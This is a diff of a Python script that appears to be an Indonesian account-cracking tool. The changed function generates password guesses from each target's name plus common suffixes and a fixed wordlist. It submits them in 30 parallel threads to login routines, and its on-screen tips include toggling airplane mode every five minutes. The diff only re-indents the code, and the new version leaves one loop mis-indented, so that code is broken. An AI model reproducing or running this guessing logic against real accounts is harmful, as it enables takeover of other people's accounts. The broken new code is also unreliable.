@@ -693,78 +693,78 @@ def setting():
     passwrd()
 #-------------------[ BAGIAN-WORDLIST ]------------#
 def passwrd():
-    global prog,des
-    bi = random.choice([u,k,kk,b,h,hh])
-    print('')
-    urut = []
-    urut.append(panel(f'        [bold green]%s [bold white]'%(okc),width=40,title=f"[bold green]OK SAVE",style=f"bold cyan"))
-    urut.append(panel(f'         [bold yellow]%s [bold white]'%(cpc),width=40,title=f"[bold yellow]CP SAVE",style=f"bold cyan"))
-    wa.print(Columns(urut))
-    Console(width=80, style="bold cyan").print(Panel(f'\t[bold yellow]hidup/matikan Mode Pesawat Setiap 5 menit',title=f"[bold green]Informasi"))
-    prog = Progress(TextColumn('{task.description}'))
-    des = prog.add_task('',total=len(id2))
-    with prog:
-        with tred(max_workers=30) as pool:
-            for yuzong in id2:
-                idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-                frs = nmf.split(" ")[0]
-                pwv = ['anjing123','koplo123','sayang','sayangku','sayang123','bismillah','katasandi','sandi123','malang','bismillah123','koplak123']
-                if len(nmf)<6:
-                    if len(frs)<3:
-                        pass
-                    else:
-                        pwv.append(nmf)
-                        pwv.append(frs+'1')
-                        pwv.append(frs+'2')
-                        pwv.append(frs+'3')
-                        pwv.append(frs+'00')
-                        pwv.append(frs+'01')
-                        pwv.append(frs+'02')
-                        pwv.append(frs+'03')
-                        pwv.append(frs+'04')
-                        pwv.append(frs+'05')
-                        pwv.append(frs+'06')
-                        pwv.append(frs+'07')
-                        pwv.append(frs+'08')
-                        pwv.append(frs+'09')
-			pwv.append(frs+'4321')
-                        pwv.append(frs+'54321')
-                        pwv.append(frs+'654321')
-                        pwv.append(frs+'7654321')
-                        pwv.append(frs+'87654321')
-                        pwv.append(frs+'987654321')
-                else:
-                    if len(frs)<3:
-                        pwv.append(nmf)
-                    else:
-                        pwv.append(nmf)
-                        pwv.append(frs+'12')
-                        pwv.append(frs+'321')
-                        pwv.append(frs+'123')
-                        pwv.append(frs+'1234')
-                        pwv.append(frs+'12345')
-                        pwv.append(frs+'123456')
-                        pwv.append(frs+'1234567')
-                        pwv.append(frs+'12345678')
-                        pwv.append(frs+'123456789')
-                    if 'ya' in pwpluss: 
-                        for xpwd in pwnya:
-                            pwv.append(xpwd)
-                    else:pass
-                if 'validate1' in method:
-                    pool.submit(validate1,idf,pwv)
-                elif 'validate2' in method:
-                    pool.submit(validate2,idf,pwv)
-                elif 'reguler1' in method:
-                    pool.submit(reguler1,idf,pwv)
-                elif 'api1' in method:
-                    pool.submit(api1,idf,pwv)
-                else:
-                    pool.submit(api1,idf,pwv)
-        print('')
-    Console(width=80, style="bold cyan").print(Panel(f'[bold green]Crack Telah Selesai,Jangan lupa Sholat Kawan',subtitle="╭───", subtitle_align="left",title=f"[bold green]Cek Opsi"))
-    Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
-    exit()
+	global prog,des
+	bi = random.choice([u,k,kk,b,h,hh])
+	print('')
+	urut = []
+	urut.append(panel(f'        [bold green]%s [bold white]'%(okc),width=40,title=f"[bold green]OK SAVE",style=f"bold cyan"))
+	urut.append(panel(f'         [bold yellow]%s [bold white]'%(cpc),width=40,title=f"[bold yellow]CP SAVE",style=f"bold cyan"))
+	wa.print(Columns(urut))
+	Console(width=80, style="bold cyan").print(Panel(f'\t[bold yellow]hidup/matikan Mode Pesawat Setiap 5 menit',title=f"[bold green]Informasi"))
+	prog = Progress(TextColumn('{task.description}'))
+	des = prog.add_task('',total=len(id2))
+	with prog:
+		with tred(max_workers=30) as pool:
+			for yuzong in id2:
+				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
+				frs = nmf.split(" ")[0]
+				pwv = ['anjing123','koplo123','sayang','sayangku','sayang123','bismillah','katasandi','sandi123','malang','bismillah123','koplak123']
+				if len(nmf)<6:
+					if len(frs)<3:
+						pass
+					else:
+						pwv.append(nmf)
+						pwv.append(frs+'1')
+						pwv.append(frs+'2')
+						pwv.append(frs+'3')
+						pwv.append(frs+'00')
+						pwv.append(frs+'01')
+						pwv.append(frs+'02')
+						pwv.append(frs+'03')
+						pwv.append(frs+'04')
+						pwv.append(frs+'05')
+						pwv.append(frs+'06')
+						pwv.append(frs+'07')
+						pwv.append(frs+'08')
+						pwv.append(frs+'09')
+						pwv.append(frs+'4321')
+						pwv.append(frs+'54321')
+						pwv.append(frs+'654321')
+						pwv.append(frs+'7654321')
+						pwv.append(frs+'87654321')
+						pwv.append(frs+'987654321')
+				else:
+					if len(frs)<3:
+						pwv.append(nmf)
+					else:
+						pwv.append(nmf)
+						pwv.append(frs+'12')
+						pwv.append(frs+'321')
+						pwv.append(frs+'123')
+						pwv.append(frs+'1234')
+						pwv.append(frs+'12345')
+						pwv.append(frs+'123456')
+						pwv.append(frs+'1234567')
+						pwv.append(frs+'12345678')
+						pwv.append(frs+'123456789')
+					if 'ya' in pwpluss: 
+					for xpwd in pwnya:
+						pwv.append(xpwd)
+					else:pass
+				if 'validate1' in method:
+					pool.submit(validate1,idf,pwv)
+				elif 'validate2' in method:
+					pool.submit(validate2,idf,pwv)
+				elif 'reguler1' in method:
+					pool.submit(reguler1,idf,pwv)
+				elif 'api1' in method:
+					pool.submit(api1,idf,pwv)
+				else:
+					pool.submit(api1,idf,pwv)
+			print('')
+		Console(width=80, style="bold cyan").print(Panel(f'[bold green]Crack Telah Selesai,Jangan lupa Sholat Kawan',subtitle="╭───", subtitle_align="left",title=f"[bold green]Cek Opsi"))
+		Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
+		exit()
 
 #--------------------[ METODE VALIDATE ]-----------------#
 def validate1(idf,pwv):
